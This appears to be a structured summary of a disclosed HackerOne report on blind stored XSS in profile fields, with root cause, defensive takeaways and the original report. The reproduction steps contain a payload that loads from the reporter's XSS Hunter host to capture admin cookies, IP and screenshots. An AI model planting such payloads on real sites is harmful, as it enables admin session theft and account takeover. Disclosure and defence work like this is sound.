# Blind Stored XSS on Profile Fields Leading to Admin Account Takeover

## Metadata
- **Source:** HackerOne
- **Report:** 1110243 | https://hackerone.com/reports/1110243
- **Submitted:** 2021-02-24
- **Reporter:** hemantsolo
- **Program:** Undisclosed (Redacted)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Stored XSS, Blind XSS, Insufficient Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
Blind stored XSS vulnerability exists in user profile fields (first name, last name, company name, title) that fail to sanitize HTML and JavaScript code. When an admin views an affected user profile, the malicious payload executes and exfiltrates sensitive information including session cookies, IP address, and internal application details via XSS Hunter.

## Attack scenario
1. Attacker creates or modifies a user account on the target platform
2. Attacker injects XSS Hunter payload (e.g., data URI with img tag) into profile fields that lack proper validation
3. Payload is stored in the database without sanitization or encoding
4. Administrator accesses the attacker's profile through the admin panel
5. Stored JavaScript executes in the admin's browser context with their privileges
6. XSS Hunter receives exfiltrated data including admin cookies, IP, screenshots, and internal service information

## Root cause
Profile input fields implement insufficient input validation and output encoding. Server-side validation does not strip or escape HTML/JavaScript tags, and frontend rendering does not encode user-supplied data before displaying it in the DOM. This allows arbitrary JavaScript execution when admins view profiles.

## Attacker mindset
Opportunistic insider or external attacker seeking to escalate privileges from regular user to admin. Primary goals are cookie theft for session hijacking and reconnaissance of internal infrastructure. The blind XSS approach avoids immediate detection since the attacker doesn't see results directly but relies on XSS Hunter callbacks.

## Defensive takeaways
- Implement server-side input validation to reject or strip HTML/JavaScript in all user-supplied profile fields
- Apply proper output encoding (HTML entity encoding) when rendering user data in web templates
- Use security libraries like DOMPurify or similar for client-side sanitization as defense-in-depth
- Implement Content Security Policy (CSP) headers to restrict script execution from non-whitelisted sources
- Apply HttpOnly and Secure flags on session cookies to prevent JavaScript access
- Conduct security code review of all user input processing pipelines
- Implement automated testing for XSS vulnerabilities in CI/CD pipeline
- Deploy Web Application Firewall (WAF) rules to detect and block common XSS patterns

## Variant hunting
Check all profile/user metadata fields for similar blind XSS (bio, about, location, phone, address, etc.)
Test form submission endpoints that accept user input across the application
Examine admin panel pages that display user-generated content
Review comment, review, feedback, and messaging features for stored XSS
Test file upload descriptions, metadata, and naming fields
Verify custom field functionality if available to users
Check API endpoints that process and return user data without encoding
Test stored XSS with alternative payloads (script tags, event handlers, SVG-based XSS)
Investigate if XSS is reflected in notifications, emails, or admin reports

## MITRE ATT&CK
- T1190
- T1566
- T1566.002
- T1598
- T1185
- T1539
- T1621

## Notes
This is a blind XSS vulnerability requiring admin interaction for payload execution. The use of XSS Hunter demonstrates sophisticated reconnaissance capability. Session cookie exfiltration represents critical risk for account takeover. The vulnerability affects multiple profile fields, suggesting systemic input validation failures across the profile module. Remediation should address root cause (input validation and output encoding) rather than individual fields.

## Full report
<details><summary>Expand</summary>

##Hello Team,
I am Hemant Patidar working as a security researcher and I found a bug in your site.
Report of bug is as follows:-

##Vulnerable URL:
https://████████/

##Description:
I have found that various field of the profile page is not properly configured to wipe out HTML tags and Javascript code which leads to store the blind XSS payload in the first name, last name, title etc. and whenever the admin will check the profile the code will fire and we will get response in the XSS Hunter along with the screenshot of the admin side, IP and cookies and other sensitive information.

POC: 
XSS Hunter report attached.

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customers and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to the URL by opening your account: https://█████/█████████
2. Now enter the below payload in the First name, last name, company name and title: data: "><img src="https://hemantsolo.xss.ht>/index.html?c=hemantsolo_xss" />
3. Now wait for some time you will get an XSS fire email via XSS hunter along with the screenshot and other sensitive info.

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
